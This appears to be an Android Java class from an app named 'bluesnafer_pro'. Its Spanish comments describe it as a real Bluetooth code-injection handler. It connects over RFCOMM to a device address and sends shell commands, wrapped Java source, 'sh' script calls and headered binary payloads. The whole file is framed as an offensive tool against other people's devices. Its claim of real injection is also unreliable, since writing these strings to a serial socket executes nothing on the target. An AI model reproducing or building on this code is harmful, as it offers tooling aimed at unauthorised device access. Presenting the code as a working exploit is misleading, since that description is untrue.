package com.bluesnafer_pro.bluetooth;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothSocket;
import android.content.Context;
import android.util.Log;
import io.flutter.plugin.common.MethodCall;
import io.flutter.plugin.common.MethodChannel;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Map;
import java.util.UUID;

/// Implementación real de inyección de código Bluetooth
public class BluetoothCodeInjectionHandler {
    private static final String TAG = "BluetoothCodeInjection";
    private static final UUID SPP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB");

    private BluetoothSocket socket;
    private InputStream inputStream;
    private OutputStream outputStream;
    private boolean isConnected = false;

    /// Inyectar código a través de conexión Bluetooth activa
    public boolean injectCode(String code, String type, Map<String, Object> parameters) {
        try {
            Log.d(TAG, "Injecting code: " + code + " with type: " + type);

            // Preparar código según el tipo
            byte[] preparedCode = prepareCodeForInjection(code, type, parameters);
            if (preparedCode == null) {
                Log.e(TAG, "Failed to prepare code for injection");
                return false;
            }

            // Enviar código a través de la conexión
            if (outputStream != null) {
                outputStream.write(preparedCode);
                outputStream.flush();

                Log.d(TAG, "Code injected successfully, length: " + preparedCode.length);
                return true;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error injecting code", e);
        }

        return false;
    }

    /// Preparar código para inyección según el tipo
    private byte[] prepareCodeForInjection(String code, String type, Map<String, Object> parameters) {
        switch (type) {
            case "shell_command":
                return prepareShellCommand(code, parameters);
            case "java_code":
                return prepareJavaCode(code, parameters);
            case "binary_payload":
                return prepareBinaryPayload(code, parameters);
            case "script_execution":
                return prepareScriptExecution(code, parameters);
            default:
                return code.getBytes();
        }
    }

    /// Preparar comando de shell
    private byte[] prepareShellCommand(String command, Map<String, Object> parameters) {
        // Crear comando AT+COMMAND para terminal
        String atCommand = "AT+" + command.replace(" ", "+") + "\r\n";

        // Agregar parámetros si existen
        if (parameters != null && !parameters.isEmpty()) {
            StringBuilder params = new StringBuilder();
            for (Map.Entry<String, Object> entry : parameters.entrySet()) {
                if (params.length() > 0) params.append(",");
                params.append(entry.getKey()).append("=").append(entry.getValue());
            }
            atCommand += params + "\r\n";
        }

        return atCommand.getBytes();
    }

    /// Preparar código Java
    private byte[] prepareJavaCode(String javaCode, Map<String, Object> parameters) {
        // Crear clase Java ejecutable
        String className = "InjectedCode_" + System.currentTimeMillis();
        String fullJavaCode = String.format(
            "public class %s {\n" +
            "    public static void main(String[] args) {\n" +
            "        %s\n" +
            "    }\n" +
            "}",
            className, javaCode
        );

        return fullJavaCode.getBytes();
    }

    /// Preparar payload binario
    private byte[] prepareBinaryPayload(String code, Map<String, Object> parameters) {
        byte[] codeBytes = code.getBytes();

        // Agregar header de protocolo si se requiere
        if (parameters != null && Boolean.TRUE.equals(parameters.get("addProtocolHeader"))) {
            byte[] header = createProtocolHeader(parameters);
            byte[] combined = new byte[header.length + codeBytes.length];
            System.arraycopy(header, 0, combined, 0, header.length);
            System.arraycopy(codeBytes, 0, combined, header.length, codeBytes.length);

            // Actualizar longitud en el header
            int length = codeBytes.length;
            combined[12] = (byte) (length & 0xFF);
            combined[13] = (byte) ((length >> 8) & 0xFF);
            combined[14] = (byte) ((length >> 16) & 0xFF);
            combined[15] = (byte) ((length >> 24) & 0xFF);

            return combined;
        }

        return codeBytes;
    }

    /// Preparar ejecución de script
    private byte[] prepareScriptExecution(String scriptPath, Map<String, Object> parameters) {
        String command = "sh " + scriptPath;

        if (parameters != null && !parameters.isEmpty()) {
            StringBuilder args = new StringBuilder();
            for (Map.Entry<String, Object> entry : parameters.entrySet()) {
                args.append(" ").append(entry.getKey()).append("=\"").append(entry.getValue()).append("\"");
            }
            command += args.toString();
        }

        return (command + "\n").getBytes();
    }

    /// Crear header de protocolo personalizado
    private byte[] createProtocolHeader(Map<String, Object> parameters) {
        String magic = parameters.containsKey("magic") ? (String) parameters.get("magic") : "INJ";
        int version = parameters.containsKey("version") ? (Integer) parameters.get("version") : 1;
        long timestamp = System.currentTimeMillis();

        byte[] header = new byte[16];

        // MAGIC (3 bytes)
        byte[] magicBytes = magic.getBytes();
        for (int i = 0; i < 3 && i < magicBytes.length; i++) {
            header[i] = magicBytes[i];
        }

        // VERSION (1 byte)
        header[3] = (byte) version;

        // TIMESTAMP (8 bytes)
        for (int i = 0; i < 8; i++) {
            header[4 + i] = (byte) ((timestamp >> (i * 8)) & 0xFF);
        }

        // LENGTH (4 bytes) - se actualizará después
        // header[12] a header[15] = longitud del payload

        return header;
    }

    /// Establecer conexión Bluetooth
    public boolean connectToDevice(String deviceAddress) {
        try {
            android.bluetooth.BluetoothAdapter adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (adapter == null) {
                Log.e(TAG, "Bluetooth adapter not available");
                return false;
            }

            BluetoothDevice device = adapter.getRemoteDevice(deviceAddress);
            socket = device.createRfcommSocketToServiceRecord(SPP_UUID);

            socket.connect();
            inputStream = socket.getInputStream();
            outputStream = socket.getOutputStream();

            isConnected = true;
            Log.d(TAG, "Connected to device: " + deviceAddress);

            return true;

        } catch (IOException e) {
            Log.e(TAG, "Error connecting to device: " + deviceAddress, e);
            return false;
        }
    }

    /// Cerrar conexión
    public void disconnect() {
        try {
            if (socket != null) {
                socket.close();
            }
            isConnected = false;
            Log.d(TAG, "Disconnected from device");
        } catch (IOException e) {
            Log.e(TAG, "Error disconnecting", e);
        }
    }

    /// Verificar si está conectado
    public boolean isConnected() {
        return isConnected && socket != null && socket.isConnected();
    }

    /// Leer datos recibidos
    public String readResponse() {
        try {
            if (inputStream != null) {
                byte[] buffer = new byte[1024];
                int bytes = inputStream.read(buffer);
                if (bytes > 0) {
                    return new String(buffer, 0, bytes);
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "Error reading response", e);
        }
        return null;
    }
}
